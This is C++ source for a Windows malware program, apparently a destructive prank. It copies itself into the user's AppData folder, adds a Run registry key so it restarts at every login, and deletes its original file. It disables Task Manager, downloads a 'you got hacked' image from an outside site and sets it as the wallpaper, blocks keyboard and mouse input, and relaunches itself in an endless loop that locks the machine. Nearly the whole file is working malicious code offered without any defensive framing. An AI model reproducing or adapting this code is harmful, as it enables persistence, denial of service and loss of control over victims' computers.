#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <iostream>
#include <string>
#include <stdio.h>
#include <winuser.h>
#include <fstream>
#include <istream>
#include <urlmon.h>
#include <tchar.h>
#pragma comment (lib, "urlmon.lib")

using namespace std;


//prototypes
string exe_path();
string get_username();
void autostart();
void setup(string record_path);
void download_and_set_wallpaper();
void buh_bye();
void fuck_shit_up();

void download_and_set_wallpaper()
{
    TCHAR url[] = TEXT("http://assets.diylol.com/hfs/653/655/aa6/resized/bro-meme-generator-yo-dawg-you-got-hacked-yolo-8fe109.jpg");

    TCHAR path[] = TEXT("C:\\image.jpg");

    HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);

	char szMyAppPath[] = {"C:\\image.jpg"};
	char szRunKey[] = {"Control Panel\\Desktop"};
	char szMyappSubKey[] = {"Wallpaper"};
    HKEY hKey;
	//cout << szMyAppPath << endl;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, szRunKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, szMyappSubKey, 0, REG_SZ, (const unsigned char*)szMyAppPath, sizeof(szMyAppPath));
	}
	//int status = InitiateShutdown(NULL, NULL, 0, SHUTDOWN_RESTART, 0);

	ShellExecute(NULL, "open", "https://www.youtube.com/watch?v=XWRJ1wVGuzc", NULL, NULL, SW_SHOWNORMAL);

	Sleep(26000);

}

void fuck_shit_up(string final_path)
{
	int i = 1;

		BlockInput(true);
	while(i!=0)
	{
		ShellExecute(NULL, "open", final_path.c_str(), NULL, NULL, SW_SHOWDEFAULT);	//execute
	}

	
}

void autostart() //sets program to autostart by creating a registry entry in the run folder of the registry
{
	string username = get_username();
	char user[50];
	char szMyAppPath[300];
	strcpy(user, username.c_str());
	
	strcpy(szMyAppPath, "C:\\Users\\");
	strcat(szMyAppPath, user);
	strcat(szMyAppPath, "\\AppData\\Roaming\\a.exe");
	
	cout << szMyAppPath << endl;
	
	char szRunKey[] = {"Software\\Microsoft\\Windows\\CurrentVersion\\Run"};
	char szMyappSubKey[] = {" "};
    HKEY hKey;
	//cout << szMyAppPath << endl;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, szRunKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, szMyappSubKey, 0, REG_SZ, (const unsigned char*)szMyAppPath, sizeof(szMyAppPath));
	}
}

void lock_down() // sets DisableTaskMgr in the registry to 1(disabled)
{
	char szRunKey[] = {"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"};
	DWORD value = 1;
	char szMyappSubKey[] = {"DisableTaskMgr"};
    HKEY hKey;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, szRunKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
		RegSetValueEx(hKey, szMyappSubKey, 0, REG_DWORD, (LPBYTE)&value , sizeof(DWORD));
	}
}

string exe_path() //gets the path of file when executed
{
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    string::size_type pos = string( buffer ).find_last_of( "\\/" );
    return string( buffer ).substr( 0, pos);
}

string get_username()//gets current user id
{
	
char user_name[10];
 DWORD user_name_size = sizeof(user_name);
 GetUserName(user_name, &user_name_size);
 return user_name;
}

void setup(string record_path)
{
	char something[100];
	DWORD nRead;
	int tmp;
	
	Sleep(500); //pause for 1/2 second

	cout << endl << "in the desired directory" << endl;
	autostart(); //set registry entry to autostart
	
	HANDLE hFile = CreateFile(record_path.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); //open record file
	ReadFile(hFile, something, 1000, &nRead, NULL); //read data in record file
	CloseHandle(hFile);
	
	cout << "Delete Files?" << endl;

	cin >> tmp;
	
	DeleteFile(something); //delete initial binary file
	cout << something << endl;

	//cin >> tmp;
	DeleteFile(record_path.c_str()); //delete record file
}

int main(void)
{
	string username;
	string desired_path;
	string current_path;
	string final_path;
	string record_path;
	HANDLE hFile;
	DWORD nWritten;
	int tmp2;
	
	current_path = exe_path() + "\\a.exe";
	
	//cout << current_path;
	
	username = get_username();
	
	// cout << username << endl;
	
	desired_path = "C:\\Users\\" + username + "\\AppData\\Roaming";

	cout << "Desired Path: " << desired_path << endl;
	cout << "Current Path: " << current_path << endl;
	
	final_path = desired_path + "\\a.exe";
	record_path = desired_path + "\\a.txt";

	//cin >>tmp2;
	
	if(exe_path() != desired_path) //if not in the appdata folder for the user, copy to it, record where this file was executed, and execute the new file.
	{
		cout << "Not in desired directory" << endl;
	
		CopyFile( current_path.c_str(), final_path.c_str(), TRUE); //copy binary to appdata folder
		hFile = CreateFile(record_path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_ARCHIVE | SECURITY_IMPERSONATION, NULL); //create record file
		WriteFile(hFile, current_path.c_str(), strlen(current_path.c_str()), &nWritten, NULL); //write to record file
		CloseHandle(hFile);
		ShellExecute(NULL, "open", final_path.c_str(), NULL, NULL, SW_SHOWDEFAULT);	//execute
		//cin >>tmp2;
	}
	else //if in the appdata folder
	{
		setup(record_path); //set t autorun and delete old binary
		lock_down(); //turn off task manager

		download_and_set_wallpaper();
		cout << "FINISH HIM" << endl;
		cin >> tmp2;
		fuck_shit_up(final_path);
	}
	//cin >> tmp2;

}